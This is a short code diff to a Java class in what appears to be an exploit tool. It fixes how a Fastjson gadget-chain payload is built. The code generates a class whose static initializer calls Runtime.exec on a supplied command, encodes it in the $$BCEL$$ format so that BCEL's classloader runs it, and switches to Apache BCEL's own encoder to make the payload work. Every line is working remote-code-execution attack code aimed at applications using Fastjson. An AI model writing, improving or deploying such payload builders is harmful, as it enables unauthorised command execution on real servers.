@@ -72,12 +72,11 @@ public class FastjsonChainHandler implements ChainHandler {
     private String bcelDriverClassName(String cmd, Map<String, Object> params) throws Exception {
         // Generate a class with exec in static initializer — BCEL classloader runs
         // Class.forName(name, true, bcelClassLoader) which triggers static init.
-        // CustomBytecodeHandler puts exec in doFilter() which never gets called.
         byte[] classBytes = generateBcelExecClass(cmd);
-        // BCEL encoding: standard base64 with + → $ and / → !
-        String b64 = Base64.getEncoder().encodeToString(classBytes)
-                          .replace("+", "$").replace("/", "!");
-        return "$$BCEL$$" + b64;
+        // Use Apache BCEL's Utility.encode() for correct $$BCEL$$ format.
+        // Apache BCEL 6.x uses a custom encoding ($X notation), NOT standard base64 with substitutions.
+        String encoded = org.apache.bcel.classfile.Utility.encode(classBytes, false);
+        return "$$BCEL$$" + encoded;
     }
 
     /** Generate a class whose static initializer calls Runtime.exec(cmd). */
